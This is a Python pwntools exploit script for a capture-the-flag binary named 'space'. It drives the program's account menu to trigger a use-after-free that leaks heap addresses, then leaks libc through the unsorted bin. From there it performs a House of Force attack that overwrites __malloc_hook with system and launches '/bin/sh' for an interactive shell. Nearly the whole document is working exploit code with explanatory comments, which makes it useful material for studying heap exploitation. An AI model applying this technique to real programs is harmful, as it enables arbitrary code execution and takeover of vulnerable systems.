from pwn import *

elf = context.binary = ELF("./space")
libc = ELF("./lib/libc.so.6")

gs="""

contextwatch execute "vis"

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
    .above(of="main", display="expressions", size="75%")
    .left(of="expressions", display="disasm", size="35%")
    .above(of="disasm", display="stack")
    .above(of="stack", display="regs")
).build(nobanner=True)
end

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug("./space", gdbscript=gs, env={"LD_LIBRARY_PATH": "/home/kali/Desktop/spaceforce/lib/"})
    else:
        return process("./space", env={"LD_LIBRARY_PATH": "/home/kali/Desktop/spaceforce/lib/"})


# This function is a bit of a mess, the binary was pretty picky about it's inputs
def make_account(first_name=b"\0"*30, last_name=b"B"*30, year=None, day=None, month=None, comment=None, comment_length=None, newline=False):
    global index

    assert len(first_name) <= 30
    assert len(last_name) <= 30

    if month is not None:
        assert len(month) <= 32

    if (comment is not None) and (comment_length is not None):
        assert len(comment) == comment_length

    should_date = (year is not None) or (day is not None) or (month is not None)
    should_comment = (comment is not None) or (comment_length is not None)

    io.sendline("1")
    io.sendlineafter("first name: ", first_name)
    io.sendlineafter("last name: ", last_name)

    io.recvuntil("date? [y]: ")
    if should_date:
        io.send("y\n") 
        io.sendlineafter(":", f"{year}" if year is not None else "1")
        io.recvuntil(":")
        if month is not None and len(month) == 32:
            io.send(month)
        else:
            io.sendline(month if month is not None else "month")
        
        io.sendlineafter(":", f"{day}" if day is not None else "2")
    else:
        io.sendline("n")

    io.recvuntil("comment? [y]: ")
    if should_comment:
        io.sendline("y")
        comment_length_str = f"{(comment_length)}" if comment_length is not None else f"{(len(comment))}"
        io.sendlineafter(":", comment_length_str)
        if comment is not None and newline:
            comment += b"\n"
        io.sendafter(":", comment if comment is not None else "a\n")
    else:
        io.sendline("n")

    io.sendlineafter("[y/n]:", "n")
    io.recvuntil("> ")

    index += 1
    return index - 1


def get_account(account_id=None, standalone=False):
    assert (account_id is not None) or (standalone)
    if not standalone:
        io.sendline("3")
        io.sendline(f"{account_id}")

    io.recvuntil("uid: ")
    uid_str = io.recvline()
    uid = int(uid_str)

    io.recvuntil("name: ")
    first_name = io.recvline()

    io.recvuntil("name: ")
    last_name = io.recvline()

    if not standalone:
        io.sendlineafter("[y/n]:", "n")
        io.recvuntil("> ")

    return {
        "uid": uid,
        "first_name": first_name,
        "last_name": last_name
    }


def __get_expiration_info():
    io.recvuntil("Account expires on ")
    expr_string = io.recvline()

    # Example expiration string:
    # Account expires on month 2, 1

    # Parse this backwards, in case there are spaces in the month
    tokens = expr_string.split(b" ")
    year = int(tokens.pop())
    day = int(tokens.pop()[:-1]) # Remove the trailing comma
    month = b" ".join(tokens) # Everything left is part of the month

    return {
        "year": year,
        "month": month,
        "day": day
    }


def get_all_accounts():
    io.sendline("2")

    accounts = []
    for _ in range(index):
        account = get_account(standalone=True)
        expiration_info = __get_expiration_info()

        account["expiration_info"] = expiration_info
        
        accounts.append(account)

    io.sendlineafter("[y/n]:", "n")
    io.recvuntil("> ")

    return accounts

def delete_last_account():
    global index
    io.sendline("4")
    io.sendlineafter("[y/n]:", "n")
    io.recvuntil("> ")

    index -= 1

index = 0

io = start()
io.recvuntil("> ")

# Set up a read after free on account A's expiration info chunk, leaking the heap address 
A = make_account()

# We need get a chunk in the unsorted bin to leak libc, so we need to set up a fake chunk to free it
# (the comment chunk itself ends up getting consolidated into the top chunk, but the data remains)
fake_chunks = p64(0) + p64(0x21) + p64(0)*3 + p64(0x21)
fake_chunk_offset = 0x500 - 0x20 - 0x70 - 0x10
B = make_account(comment=flat({fake_chunk_offset: fake_chunks}, length=0x4f8))

delete_last_account()
delete_last_account()

# Re allocating A causes it to resuse a 0x20 chunk that has a pointer to the heap aligned across the 
# expiration_info struct's year and day fields. Since the binary doesn't clear these fields if the user
# decides not to set them, we can read them out and leak an address on the heap
A2 = make_account()
expr_info = get_all_accounts()[0]["expiration_info"]

# We get the 64bit pointer back as 2 32-bit signed integers, so this does the requisite shuffling
fd_pointer = u64( p32(expr_info["day"], signed=True) + p32(expr_info["year"], signed=True) )

heap_address = fd_pointer - 0x360 # We know the offset from the linked chunk to the base of the heap
print(f"HEAP: {hex(heap_address)}")

# Delete and reallocate A so we can overwrite the size of B's account chunk and force it to be freed into
# the unsorted bin instead of the tcache
delete_last_account()
A3 = make_account(month = p64(0)*2 + p64(0x501) + p64(0))
B2 = make_account(comment=flat({0xb0: p64(0)}, length=0xb8))

# B's account chunk is now sized 0x500, too big for the tcache. So it gets placed into the unsorted bin
# This uses the fake chunks set up in B's original comment
delete_last_account()

# Since there are no free 0x70 chunks in the tcache, the requests gets served by the unsorted bin where it
# remainders the chunk off of the 0x500 one there, putting the remaindered chunk info right on top of B's
# expiration field info. This leaks the addess of the main arena, and hence libc
B3 = make_account()
expr_info = get_all_accounts()[1]["expiration_info"]

unsorted_bin_chunk_address = u64( p32(expr_info["day"], signed=True) + p32(expr_info["year"], signed=True) )
main_arena_address = unsorted_bin_chunk_address - 96
libc.address = main_arena_address - libc.sym.main_arena
print(f"LIBC ADDRESS {hex(libc.address)}")

# Clear out the unsorted bin by allocating an exact sized chunk, as well as overwrite the top chunk size
# To set up House of Force
C = make_account(comment = flat({96: p64(0)}, length=0x418, filler = p64(0xfffffffffffffff1)))

# Calculate the size of the chunk we need to force the top chunk to be located by the malloc hook. This 
# took some fiddling
top_chunk_address = heap_address + 0x430
distance = (libc.sym.__malloc_hook - 0x70 - 0x20 - 0x30) - top_chunk_address

print(f"Top Chunk: {hex(top_chunk_address)}")
print(f"Distance: {distance}")

D = make_account(comment_length=distance)

#The above fucks with the menu state a little for some reason, so we need to fix that
_garbage = io.clean()
if b"[y/n]" in _garbage:
    io.sendline("n")

# The last name field of this chunk ends up overlapping __malloc_hook, so we overwrite that with 
# system. The next malloc for the comment gets called with the address of /bin/sh as it's size,
# which gets passed to system
E = make_account(last_name=p64(libc.sym.system), comment_length=next(libc.search(b"/bin/sh\0")))

io.interactive()
